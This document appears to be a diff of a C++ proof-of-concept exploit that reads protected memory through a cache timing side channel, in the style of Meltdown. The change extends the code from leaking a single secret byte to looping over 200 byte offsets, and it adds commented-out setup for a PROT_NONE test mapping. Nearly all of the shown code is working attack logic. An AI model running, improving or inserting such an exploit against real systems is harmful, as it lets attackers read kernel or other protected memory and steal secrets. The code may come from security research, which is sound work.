@@ -63,18 +63,21 @@ int main(int argc, char** argv) {
   unprotected_mapping = (unsigned char*)mmap(0,256*81920,PROT_READ | PROT_WRITE,MAP_ANONYMOUS | MAP_PRIVATE,0,0);
   printf("Created protected mapping at %p\n",protectedMapping);
   printf("Unprotected mapping starts at %p\n",unprotected_mapping);
-  
+  /*int zero = open("/dev/zero",O_RDWR);
+  protectedMapping = mmap(0,4096,PROT_READ | PROT_WRITE,MAP_SHARED,zero,0);
+  memcpy(protectedMapping,"Test",5);
+  mprotect(protectedMapping,4096,PROT_NONE);*/
   //Uncomment to show that cache backchannel works.
   //protectedMapping = (void*)"Test";
   
   
-  
+  for(size_t c = 0;c<200;c++) {
   unsigned long long values[256] = {0};
   char* unrelated_data = new char[1000*1000];
   
   for(size_t i = 0;i<256*50;i++) {
     memset(unrelated_data,0,1000*1000);
-    values[i % 256]+=hack_address((unsigned char*)protectedMapping,i % 256);
+    values[i % 256]+=hack_address(((unsigned char*)protectedMapping)+c,i % 256);
   }
   
   unsigned long long bestFit;
@@ -88,6 +91,8 @@ int main(int argc, char** argv) {
   }
   
   printf("The first byte in the secret is %c\n",bestValue);
+  
+  }
     
     
   sleep(-1);
